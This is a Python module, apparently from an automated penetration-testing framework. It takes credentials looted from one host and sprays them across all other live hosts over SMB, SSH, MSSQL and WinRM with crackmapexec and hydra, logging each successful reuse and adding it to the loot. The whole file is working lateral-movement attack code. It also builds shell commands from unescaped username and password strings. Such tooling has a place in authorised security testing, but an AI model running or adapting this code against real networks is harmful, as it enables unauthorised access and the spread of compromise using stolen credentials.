import os
from core.executor import safe_run
from core.logger import get_logger
from core.utils import make_out_dir
from config import tool_available, get_profile

def run(ctx):
    log = get_logger(); log.banner("POST -- Credential Spraying"); log.set_phase("cred_spray")
    creds = ctx.loot.get("credentials",[])
    if not creds: log.info("No credentials to spray"); return
    profile = get_profile(); out_dir = make_out_dir(ctx.out_dir, "post")
    new_found = []

    for host in ctx.live_hosts:
        ports = ctx.open_ports.get(host,{}).get("tcp",[])
        for cred in creds:
            user = cred.get("user",""); pw = cred.get("password","")
            orig_host = cred.get("host","")
            if not user or host == orig_host: continue  # skip original host

            # SMB spray via CME
            if 445 in ports and tool_available("crackmapexec"):
                rc, out, _ = safe_run(
                    f"crackmapexec smb {host} -u '{user}' -p '{pw}'",
                    timeout=20, label=f"spray-smb-{host}"
                )
                if "[+]" in out or "pwn3d" in out.lower():
                    ctx.add_finding("CRITICAL", host,
                                    f"Credential reuse: {user}:{pw} on SMB", out[:200])
                    new_found.append({"host":host,"service":"smb","user":user,"password":pw})
                    log.success(f"  Cred reuse: {user}:{pw} -> {host} SMB")

            # SSH spray via hydra (correct flags: -l for login, -p for pass)
            if 22 in ports and tool_available("hydra"):
                rc2, out2, _ = safe_run(
                    f"hydra -l '{user}' -p '{pw}' -t 1 -f {host} ssh",
                    timeout=15, label=f"spray-ssh-{host}"
                )
                if "[22][ssh]" in out2 and "login:" in out2.lower():
                    ctx.add_finding("CRITICAL", host,
                                    f"Credential reuse: {user}:{pw} on SSH", out2[:200])
                    new_found.append({"host":host,"service":"ssh","user":user,"password":pw})
                    log.success(f"  Cred reuse: {user}:{pw} -> {host} SSH")

            # MSSQL spray
            if 1433 in ports and tool_available("crackmapexec"):
                rc3, out3, _ = safe_run(
                    f"crackmapexec mssql {host} -u '{user}' -p '{pw}'",
                    timeout=15, label=f"spray-mssql-{host}"
                )
                if "[+]" in out3:
                    ctx.add_finding("CRITICAL", host,
                                    f"Credential reuse: {user}:{pw} on MSSQL", out3[:200])
                    new_found.append({"host":host,"service":"mssql","user":user,"password":pw})
                    log.success(f"  Cred reuse: {user}:{pw} -> {host} MSSQL")

            # WinRM spray via CME
            if any(p in ports for p in [5985,5986]) and tool_available("crackmapexec"):
                rc4, out4, _ = safe_run(
                    f"crackmapexec winrm {host} -u '{user}' -p '{pw}'",
                    timeout=15, label=f"spray-winrm-{host}"
                )
                if "pwn3d" in out4.lower() or "[+]" in out4:
                    ctx.add_finding("CRITICAL", host,
                                    f"WinRM credential reuse: {user}:{pw}", out4[:200])
                    log.success(f"  WinRM: {user}:{pw} -> {host}")

    for c in new_found:
        ctx.loot.setdefault("credentials",[]).append(c)
    log.success(f"Credential spraying complete: {len(new_found)} new accesses")
